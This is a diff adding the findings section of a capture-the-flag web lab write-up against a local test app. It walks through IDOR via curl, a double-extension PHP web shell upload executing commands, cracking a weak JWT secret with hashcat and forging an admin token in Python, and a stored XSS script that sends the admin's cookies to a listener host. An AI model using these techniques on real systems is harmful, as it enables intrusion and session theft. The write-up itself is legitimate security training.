@@ -94,3 +94,153 @@ After the access to the dashboard has been confirmed, the hunting for the flags 
 
 ## Results and Findings
 This section explains in details how the vulnerabilities were identified and exploited together with the tools used to exploit them. Screenshots and commands used will be used as proof of exploitation to confirm that the exploitation happened. The attacks happened sequentially from **IDOR**,**Insecure File Uploads**, **JWT Manipulation** and lastly **Stored XSS** which allowed us to post the **admin** back to a listener running in a different port in the same host machine.
+
+### 1. Insecure Direct Object Reference (IDOR)
+This is an access control vulnerability where the application uses a user fed input to access records without properly verifying if the user has access rights to the resource.In this case, the developer API access provides access to the current users data. The request is made using ```curl``` in the format 
+```bash 
+curl -H "Authorization: Bearer <token>" http://localhost:8081/api/user/1023
+```
+where ```<token>``` is replaced by the user JWT which is available in the user's dashboard as indicated in the screenshot below.
+<img src="./Screenshots/user_jwt.png">
+[A screenshot showing users JWT token](./Screenshots/user_jwt.png).
+
+The test for IDOR starts with checking if the endpoint works by sending the request below in the terminal.
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEwMjMsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkFtYXJhIE9rb25rd28ifQ.iF29-N3M5Y0ZA47XTMTrR-aH6fRL0_E3bPtPo_7SEAU" http://localhost:8081/api/user/1023
+```
+The response from the above result is shown in the screenshot below.
+<img src="./Screenshots/response.png">
+[A screenshot showing normal response from the server](./Screenshots/response.png)<br>
+The request returns the current user data as shown in the screenshot above. When the user id was changed from ```1023``` to ```1024``` and sending the request below
+
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEwMjMsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkFtYXJhIE9rb25rd28ifQ.iF29-N3M5Y0ZA47XTMTrR-aH6fRL0_E3bPtPo_7SEAU" http://localhost:8081/api/user/1024
+```
+The server responds with the next user's data and it displays the flag ```ICDFA{idor_823d5c}``` as shown in the screenshot below.
+<img src="./Screenshots/idor_flag.png">
+[An image showing the web application is vulnerable to idor](./Screenshots/idor_flag.png).
+
+
+### 2. Insecure File Uploads
+This is a web application vulnerability where the files uploaded are not properly checked that a double extension file or a file ending with a null character( byte) is accepted and uploaded. In this case, the testing endpoint is ```http://localhost:8081/upload.php``` which accepts images only. Any other file which is not an image is rejected and the error message displayed is as shown below.
+<img src="./Screenshots/restricted_upload.png">
+[A screenshot showing showing restricted files rejected](./Screenshots/restricted_upload.png)<br>
+The web appplication accepted a php shell which allowed us to execute commands by sending the command as a url parameter.The code in the shell is as shown in the screenshot below
+![Shell](./Screenshots/shell.png).
+The web application accepted the php shell in disguise of an image and it gave a success message as shown in the screenshot below.
+<img src="./Screenshots/double_extention_file_uploaded.png">
+[A screenshot showing a successfull upload of a double extension file](./Screenshots/double_extention_file_uploaded.png).<br>
+To access the shell, a request was made to the URL ```http://localhost:8081/uploads/shell.php.png?cmd=ls``` with the command ```ls``` which displays the contents in the uploads directory as shown below.
+<img src="./Screenshots/contents_uploads.png">
+[A screenshot showing the contents in the uplloads directory](./Screenshots/contents_uploads.png)
+
+After passing in Linux directory traversal commands, the path to the flag was determined and the flag was displayed using the URL ```http://localhost:8081/uploads/shell.php.png?cmd=cd%20../../private;cat%20upload_flag.txt``` which displays the flag ```ICDFA{upload_6edb74}``` as indicated in the image below.
+<img src="./Screenshots/upload_flag.png">
+[A screenshot showing insecure file upload flag](./Screenshots/upload_flag.png).
+
+This simple shell indicates the use of a simple shell but real attackers use complicated shells. To demonstrate an example of a complicated shell is an ```Ani Shell``` which is uploaded to the server and can help you:
+- inspecte files
+- edit files
+- rewrite files
+- traverse directories among other functionalities.
+
+The screenshot below shows the **Ani Shell** command interface.
+<img src="./Screenshots/Ani_Shell.png">
+[A screenshot showing Ani Shell interface](./Screenshots/Ani_Shell.png)
+
+### JWT Manipulation
+JSON Web Token manipulation is done to take advantage of weak authorization done by the web application.The implementation may have flaws either in verification or even use weak secret key when signing it. This allows attackers to manipulate the token or generate the exact same token which appears to be valid and is accepted by the web application. In this case, the token secret key is cracked using ```hashcat``` where e genuine key is then generated to make a request to the ```admin``` API endpoint.
+The JWT was then identified using hashcat so that the cracking mode can be identified so that the cracking process will be seamless as indicated in the screenshot below.
+<img src="./Screenshots/hash_identification.png">
+[The screenshot identifying the hash mode to **_16500_**](./Screenshots/hash_identification.png).
+
+After the mode has been identified, the secret signing key was cracked using the command 
+```bash 
+hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEwMjMsInJvbGUiOiJ1c2VyIiwibmFtZSI6IkFtYXJhIE9rb25rd28ifQ.iF29-N3M5Y0ZA47XTMTrR-aH6fRL0_E3bPtPo_7SEAU /home/pirate/Desktop/Tools/rockyou.txt
+```
+It is however noted that the cracking process requires a valid JWT key so that the correct secret key can be identified. The signing key was weak and therefore hashcat cracked it very fast as captured in the screenshot below.
+<img src="./Screenshots/secret_key.png">
+[A screemshot showing hashcat cracking JWT signing key](./Screenshots/secret_key.png)<br>
+It is evident that the JWT secret signing key is ```secret123``` which will be used in the next step to craft an admin token to access ```/api/admin``` route.
+The JWT in this lab activity was generated using a python code below.
+
+```python 
+import jwt
+import getpass
+
+# HS256 secret key
+secret = "secret123"
+
+# Match the original JWT payload
+payload = {
+    "uid": 1,
+    "role": "admin",
+    "name": "Amara Okonkwo",
+    "isAdmin":True
+}
+
+# Generate JWT
+token = jwt.encode(
+    payload,
+    secret,
+    algorithm="HS256",
+    headers={
+        "typ": "JWT"
+    }
+)
+
+print("\nGenerated JWT:")
+print(token)
+```
+When the code is run, a new JWT token is printed to the console which can now allow us access the admin endpoint as the role has been set to admin.The JWT generated is ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJBbWFyYSBPa29ua3dvIiwiaXNBZG1pbiI6dHJ1ZX0.PRUdt_BD7dfmMASGSoEXTlL29YndN4ReIILStBAvUBQ```  and the claims encoded in the token is as shown below.
+```json
+{
+  "uid": 1,
+  "role": "admin",
+  "name": "Amara Okonkwo",
+  "isAdmin": true
+}
+```
+It is however noted that the isAdmin key is not necessary and it does not affect the outcome as the only crucial item here is the ```role``` which is set to admin. 
+_The user id was determined when testing for ```IDOR``` where different ids were fed in the url and the responses noted_
+Now that the admin JWT has been generated, the request is made to the admin endpoint is 
+
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJBbWFyYSBPa29ua3dvIiwiaXNBZG1pbiI6dHJ1ZX0.PRUdt_BD7dfmMASGSoEXTlL29YndN4ReIILStBAvUBQ" http://localhost:8081/api/admin
+```
+The web application responds with the response 
+```json
+{
+    "message": "Admin API access granted.",
+    "flag": "ICDFA{jwt_fc02ff}"
+}
+```
+giving out ```ICDFA{jwt_fc02ff}``` as the JWT manipulation cookie allowing us to escalate privilege to admin.
+
+### Exploiting Stored XSS
+Cross site scripting allows a web application to run javascript on the frontend. In this case, the web application does not sanitize the messages input by the user and allows them to be stored and executed by the user who will read the messages. In this scenario, the ```admin``` user will respond to the messages. For a session to be fixed, the ```/vault.php``` requires a valid admin session meaning that both the `token` and the `session` identifies must match an admin session. 
+The exploitation is done in the following steps.
+
+- create a local server to accept and log any HTTP request. This is done using php with the command ```php -S 0.0.0.0:8085```. This starts the server locally listening on port `8085` as indicated in the screenshot below.
+<img src="./Screenshots/server.png"> 
+
+[A screenshot showing a local PHP server waiting for connection](./Screenshots/server.png)
+- Load the javascript to be stored in the database for stored xss. The code stored allowed the `admin bot` to post the cookies back to the server is
+```javascript 
+<script>
+new Image().src=`http://192.168.0.108:8085?cookies=${document.cookie}`
+</script>
+```
+where the cookies will be posted as parameters with the name `cookies`
+- The cookies are then visible in the console as shown below.
+<img src="./Screenshots/admin_cookies.png">
+[A screenshot showing admin cookies](./Screenshots/admin_cookies.png)
+- fix the tokens to the browser and access the vault.The tokens are edited using the `cookie editor` extension from the browser.After the editing has been done and the `session` and `token` cookies edited to fit the same as below, the browser is refreshed and the admin console is accessible where the last flag is visible. 
+_The cookies are different from the one appearing in the screenshot above as the admin bot logs in again after some time so the cookie values change from time to time_. However, the tokens remain valid no matter how many times they change.
+Navigating to `/vault.php` gives the response as shown in the screenshot below.
+<img src="./Screenshots/xss_flag.png">
+[Screenshot showing XSS cookies from the `/vault.php` route](./Screenshots/xss_flag.png).
+
+The flag is displayed as `ICDFA{xss_4dd999}`.
+
+## Recommendations
